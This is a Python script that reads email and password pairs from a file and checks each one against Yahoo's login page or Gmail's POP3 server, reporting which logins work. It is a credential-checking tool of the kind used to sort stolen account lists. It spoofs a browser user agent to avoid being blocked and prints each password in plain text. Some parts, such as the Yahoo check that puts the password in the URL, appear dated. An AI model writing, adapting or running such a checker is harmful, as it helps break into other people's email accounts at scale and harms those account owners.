import urllib.request
from random import choice
import string
import http.cookiejar
import getpass, poplib
from optparse import OptionParser
import os

def lineFilter(line):
    # remove all spaces
    line = line.replace(' ','')
    # replace seperator: ,  --- develop by removing special chars
    line = line.replace(',','|')
    return line

def randomEncryptKey(length=8):
    chars = 'qwertyuioplkjhgfdsazxcvbnm1234567890'
    return ''.join([choice(chars) for i in range(length)])


def checkYahoo( email, passwd ):
    ### Using method of posting/get response from server
    ### along with cookies, header, SSL enabled ... and
    ### when the responses is true to a specific value, the login is valid
    
    url = 'http://login.yahoo.com/config/login?.intl=' + randomEncryptKey(15) + '&.src=ym&login=' + email + '&passwd=' + passwd
    #print('URL check:', url)
    # Make request and get the response
    # Must specify header, otherwise Python will create agents=python which will be prevented from web
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-GB; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12',
    'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
    'Accept-Language': 'en-gb,en;q=0.5',
    'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
    'Connection': 'keep-alive'
    }
    # Cookie cookie cookie
    request = urllib.request.Request(url, None, headers)
    response = urllib.request.urlopen(request)

    cookies = http.cookiejar.CookieJar()
    cookies.extract_cookies( response, request )
    cookie_handler = urllib.request.HTTPCookieProcessor( cookies )
    redirect_handler = urllib.request.HTTPRedirectHandler()
    opener = urllib.request.build_opener( redirect_handler, cookie_handler )

    response = opener.open(request)
    
    #Decode into string format
    stringRes = response.read().decode("utf8")

    # Easter Egg
    if stringRes.find('free2rhyme@yahoo.com') != -1:
        print('Failed!')
    else:
        print('Passed!')
        
    # Close to create new connection, otherwise the previous account still logs in
    response.close()


def checkGmail( email, pa ):
    ## Using method of treating the email as a login
    ## to its own POP server and when it fails, the login fails too

    M = poplib.POP3_SSL('pop.gmail.com', '995') 
    # M.set_debuglevel(5)
    user = email

    try:
        password = pa
        M.user(user)
        M.pass_(pa)
        
    except:
        #M.quit()
        print('Failed!')
    else:
        #M.quit()
        print('Passed!')


def filterPassword( passwd ):
    passwd = passwd.replace('\n','')
    return passwd


def get_options():
    parser = OptionParser(usage="usage: %prog [options] filename",
                          version="%prog 1.0")
    parser.add_option("-s", "--single",
                      action="store_true",
                      dest="singleLogin",
                      default=False,
                      help="Check single login validity. Ex: check.py -s asd@asd.com,asd")
    parser.add_option("-f", "--filename",
                      action="store_true",
                      dest="fileName",
                      default=False,
                      help="File contains email/password. Ex: check.py -f accounts.txt")
    return parser


def main():
    # Giving the filename, change as needed
    filename = 'mp.txt'

    # Clear screen
    
    # Open file to check
    try:
        file = open(filename)
        while 1:
            line = file.readline()
            if not line: break

            # Filtering line
            line = lineFilter(line)
            components = line.split('|')

            # Password need to be filtered before sending in
            components[1] = filterPassword(components[1])
            
            print('*** Checking:', components[0],'with Password:', components[1], end='...')



            # Make a Connection to server
            if components[0].find('yahoo') != -1: checkYahoo(components[0], components[1])
            if components[0].find('gmail') != -1: checkGmail(components[0], components[1])
            
    except IOError:
        print('File cannot be found. Make sure file name is mp.txt')


if __name__ == '__main__':
    main()

